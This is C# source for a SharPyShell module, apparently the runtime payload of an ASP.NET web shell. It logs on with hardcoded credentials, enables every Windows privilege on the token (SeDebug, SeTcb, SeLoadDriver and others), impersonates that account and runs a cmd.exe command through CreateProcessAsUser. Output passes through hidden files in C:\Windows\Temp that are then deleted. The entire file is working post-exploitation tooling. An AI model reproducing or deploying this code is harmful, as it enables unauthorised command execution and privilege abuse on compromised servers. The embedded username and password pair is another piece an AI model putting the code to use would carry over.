
                using System;using System.IO;using System.Diagnostics;using System.Text;
                using System.Runtime.InteropServices;using System.Security.Principal;using System.Security.Permissions;using System.Security;using Microsoft.Win32.SafeHandles;using System.Runtime.ConstrainedExecution;

                public class SharPyShell
                {
                    private const string error_string = "{{{SharPyShellError}}}";
                
                    private const int LOGON32_PROVIDER_DEFAULT = 0;
                    private const int LOGON32_PROVIDER_WINNT35 = 1;
                    private const int LOGON32_PROVIDER_WINNT40 = 2;
                    private const int LOGON32_PROVIDER_WINNT50 = 3;
            
                    private const uint GENERIC_ALL = 0x10000000;
                    private const int SecurityImpersonation = 2;
                    private const int TokenType = 1;
            
                    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
            
                    private const uint WAIT_ABANDONED = 0x00000080;
                    private const uint WAIT_OBJECT_0 = 0x00000000;
                    private const uint WAIT_TIMEOUT = 0x00000102;

                    [StructLayout(LayoutKind.Sequential)] private struct STARTUPINFO
                    {
                        public int cb;
                        public String lpReserved;
                        public String lpDesktop;
                        public String lpTitle;
                        public uint dwX;
                        public uint dwY;
                        public uint dwXSize;
                        public uint dwYSize;
                        public uint dwXCountChars;
                        public uint dwYCountChars;
                        public uint dwFillAttribute;
                        public uint dwFlags;
                        public short wShowWindow;
                        public short cbReserved2;
                        public IntPtr lpReserved2;
                        public IntPtr hStdInput;
                        public IntPtr hStdOutput;
                        public IntPtr hStdError;
                    }
                    
                    [StructLayout(LayoutKind.Sequential)] private struct PROCESS_INFORMATION
                    {
                        public IntPtr hProcess;
                        public IntPtr hThread;
                        public uint   dwProcessId;
                        public uint   dwThreadId;
                    }
                    
                    [StructLayout(LayoutKind.Sequential)] private struct SECURITY_ATTRIBUTES
                    {
                        public int    Length;
                        public IntPtr lpSecurityDescriptor;
                        public bool   bInheritHandle;
                    }
                    
                    [StructLayout(LayoutKind.Sequential)]
                    private struct LUID
                    {
                        public int LowPart;
                        public int HighPart;
                    }
                    [StructLayout(LayoutKind.Sequential)]
                    private struct TOKEN_PRIVILEGES
                    {
                        public UInt32 PrivilegeCount;
                        public LUID Luid;
                        public UInt32 Attributes;
                    }
                    
                    [DllImport("kernel32.dll", EntryPoint="CloseHandle", SetLastError=true, CharSet=CharSet.Auto, CallingConvention=CallingConvention.StdCall)]
                    private static extern bool CloseHandle(IntPtr handle);
                    
                    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
                    private static extern bool LogonUser(String lpszUsername, String lpszDomain, String lpszPassword, int dwLogonType, int dwLogonProvider, out SafeTokenHandle phToken);
        
                    [DllImport("advapi32.dll", EntryPoint="CreateProcessAsUser", SetLastError=true, CharSet=CharSet.Ansi, CallingConvention=CallingConvention.StdCall)]
                    private static extern bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
                    
                    [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx")]
                    private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, int TokenType, int ImpersonationLevel, ref IntPtr DuplicateTokenHandle);
                    
                    [DllImport("kernel32.dll", SetLastError=true)]
                    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
                    
                    [DllImport("advapi32.dll", SetLastError = true)]
                    private static extern bool AdjustTokenPrivileges(IntPtr tokenhandle, bool disableprivs, [MarshalAs(UnmanagedType.Struct)]ref TOKEN_PRIVILEGES Newstate, int bufferlength, int PreivousState, int Returnlength);
                    
                    [DllImport("advapi32.dll", SetLastError = true)]
                    private static extern int LookupPrivilegeValue(string lpsystemname, string lpname, [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid);

                    private sealed class SafeTokenHandle : SafeHandleZeroOrMinusOneIsInvalid
                    {
                        private SafeTokenHandle()
                            : base(true)
                        {
                        }
                    
                        [DllImport("kernel32.dll")]
                        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
                        [SuppressUnmanagedCodeSecurity]
                        [return: MarshalAs(UnmanagedType.Bool)]
                        private static extern bool CloseHandle(IntPtr handle);
                    
                        protected override bool ReleaseHandle()
                        {
                            return CloseHandle(handle);
                        }
                    }
                                        
                    private string EnablePrivilege(string privilege, IntPtr token){
                        string output = "";
                        LUID serLuid = new LUID();
                        LUID sebLuid = new LUID();
                        TOKEN_PRIVILEGES tokenp = new TOKEN_PRIVILEGES();
                        tokenp.PrivilegeCount = 1;
                        LookupPrivilegeValue(null, privilege, ref sebLuid);
                        tokenp.Luid = sebLuid;
                        tokenp.Attributes = SE_PRIVILEGE_ENABLED;
                        if(!AdjustTokenPrivileges(token, false, ref tokenp, 0, 0, 0)){
                            output += error_string + "\nAdjustTokenPrivileges on privilege " + privilege + " failed with error code: " + Marshal.GetLastWin32Error();
                        }
                        output += "\nAdjustTokenPrivileges on privilege " + privilege + " succeeded";
                        return output;
                    }
                    
                    private string EnableAllPrivileges(IntPtr token)
                    {
                        string output="";
                        output += EnablePrivilege("SeAssignPrimaryTokenPrivilege", token);
                        output += EnablePrivilege("SeAuditPrivilege", token);
                        output += EnablePrivilege("SeBackupPrivilege", token);
                        output += EnablePrivilege("SeChangeNotifyPrivilege", token);
                        output += EnablePrivilege("SeCreateGlobalPrivilege", token);
                        output += EnablePrivilege("SeCreatePagefilePrivilege", token);
                        output += EnablePrivilege("SeCreatePermanentPrivilege", token);
                        output += EnablePrivilege("SeCreateSymbolicLinkPrivilege", token);
                        output += EnablePrivilege("SeCreateTokenPrivilege", token);
                        output += EnablePrivilege("SeDebugPrivilege", token);
                        output += EnablePrivilege("SeDelegateSessionUserImpersonatePrivilege", token);
                        output += EnablePrivilege("SeEnableDelegationPrivilege", token);
                        output += EnablePrivilege("SeImpersonatePrivilege", token);
                        output += EnablePrivilege("SeIncreaseBasePriorityPrivilege", token);
                        output += EnablePrivilege("SeIncreaseQuotaPrivilege", token);
                        output += EnablePrivilege("SeIncreaseWorkingSetPrivilege", token);
                        output += EnablePrivilege("SeLoadDriverPrivilege", token);
                        output += EnablePrivilege("SeLockMemoryPrivilege", token);
                        output += EnablePrivilege("SeMachineAccountPrivilege", token);
                        output += EnablePrivilege("SeManageVolumePrivilege", token);
                        output += EnablePrivilege("SeProfileSingleProcessPrivilege", token);
                        output += EnablePrivilege("SeRelabelPrivilege", token);
                        output += EnablePrivilege("SeRemoteShutdownPrivilege", token);
                        output += EnablePrivilege("SeRestorePrivilege", token);
                        output += EnablePrivilege("SeSecurityPrivilege", token);
                        output += EnablePrivilege("SeShutdownPrivilege", token);
                        output += EnablePrivilege("SeSyncAgentPrivilege", token);
                        output += EnablePrivilege("SeSystemEnvironmentPrivilege", token);
                        output += EnablePrivilege("SeSystemProfilePrivilege", token);
                        output += EnablePrivilege("SeSystemtimePrivilege", token);
                        output += EnablePrivilege("SeTakeOwnershipPrivilege", token);
                        output += EnablePrivilege("SeTcbPrivilege", token);
                        output += EnablePrivilege("SeTimeZonePrivilege", token);
                        output += EnablePrivilege("SeTrustedCredManAccessPrivilege", token);
                        output += EnablePrivilege("SeUndockPrivilege", token);
                        output += EnablePrivilege("SeUnsolicitedInputPrivilege", token);
                        return output;
                    }
                    
                    [PermissionSetAttribute(SecurityAction.Demand, Name = "FullTrust")]
                    private string RunAs(string userName, string password, string domainName, string cmd, string stdout_file, string stderr_file, string working_directory, int logon_type, uint process_ms_timeout)
                    {
                        SafeTokenHandle safeTokenHandle;
                        string output = "";
                        try
                        {
                            bool returnValue = LogonUser(userName, domainName, password, logon_type, LOGON32_PROVIDER_DEFAULT, out safeTokenHandle);
                            if (false == returnValue)
                            {
                                output += error_string + "\nWrong Credentials. LogonUser failed with error code : " + Marshal.GetLastWin32Error();
                                return output;
                            }
                            using (safeTokenHandle)
                            {
                                IntPtr runasToken = safeTokenHandle.DangerousGetHandle();
                                EnableAllPrivileges(runasToken);
                                
                                string commandLinePath = "";
                                if(process_ms_timeout>0){
                                    File.Create(stdout_file).Dispose();
                                    File.Create(stderr_file).Dispose();
                                    commandLinePath =  Environment.GetEnvironmentVariable("ComSpec") + " /c \"" + cmd + "\" >> " + stdout_file + " 2>>" + stderr_file;
                                }
                                else{
                                    commandLinePath =  Environment.GetEnvironmentVariable("ComSpec") + " /c \"" + cmd + "\"";
                                }
                                using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(runasToken))
                                {
                                    IntPtr Token = new IntPtr(0);
                                    IntPtr DupedToken = new IntPtr(0);
                                    bool      ret;
                                    SECURITY_ATTRIBUTES sa  = new SECURITY_ATTRIBUTES();
                                    sa.bInheritHandle       = false;
                                    sa.Length               = Marshal.SizeOf(sa);
                                    sa.lpSecurityDescriptor = (IntPtr)0;
                                    Token = WindowsIdentity.GetCurrent().Token;
                                    
                                    ret = DuplicateTokenEx(Token, GENERIC_ALL, ref sa, SecurityImpersonation, TokenType, ref DupedToken);
                                    if (ret == false){
                                         output += error_string + "\nDuplicateTokenEx failed with " + Marshal.GetLastWin32Error();
                                        return output;
                                    }
                                    STARTUPINFO si          = new STARTUPINFO();
                                    si.cb                   = Marshal.SizeOf(si);
                                    si.lpDesktop            = "";
                                    PROCESS_INFORMATION pi  = new PROCESS_INFORMATION();
                                    
                                    ret = CreateProcessAsUser(DupedToken,null,commandLinePath, ref sa, ref sa, false, 0, (IntPtr)0, working_directory, ref si, out pi);
                                    if (ret == false){
                                        output += error_string + "\nCreateProcessAsUser failed with " + Marshal.GetLastWin32Error();
                                        return output;
                                    }
                                    else{
                                        if(process_ms_timeout>0){
                                            uint wait_for = WaitForSingleObject(pi.hProcess, process_ms_timeout);
                                            if(wait_for == WAIT_OBJECT_0){
                                                output += File.ReadAllText(stdout_file);
                                                string errors = File.ReadAllText(stderr_file);
                                                if (!String.IsNullOrEmpty(errors))
                                                    output += error_string + "\n" + errors;
                                            }
                                            else{
                                                output += error_string + "\nProcess with pid " + pi.dwProcessId + " couldn't end correctly. Error Code: " +  Marshal.GetLastWin32Error();
                                            }
                                            File.Delete(stdout_file);
                                            File.Delete(stderr_file);
                                        }
                                        else{
                                            output += "\nAsync process with pid " + pi.dwProcessId + " created";
                                        }
                                        CloseHandle(pi.hProcess);
                                        CloseHandle(pi.hThread);
                                    }
                                    CloseHandle(DupedToken);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            output += error_string + "\nException occurred. " + ex.Message;
                            return output;
                        }
                    return output;
                    }
                    
                    public byte[] ExecRuntime()
                    {
                        string output_func=RunAs(@"admin_infinity", @"Password2!", @"", @"whoami /all", @"C:\Windows\Temp\x1fvogijp5pyzn7\z73b9", @"C:\Windows\Temp\x1fvogijp5pyzn7\6p1q9tforulxt0", @"C:\Windows\Temp\infinity_edge", 3, 60000);
                        byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                        return(output_func_byte);
                    }
                }
                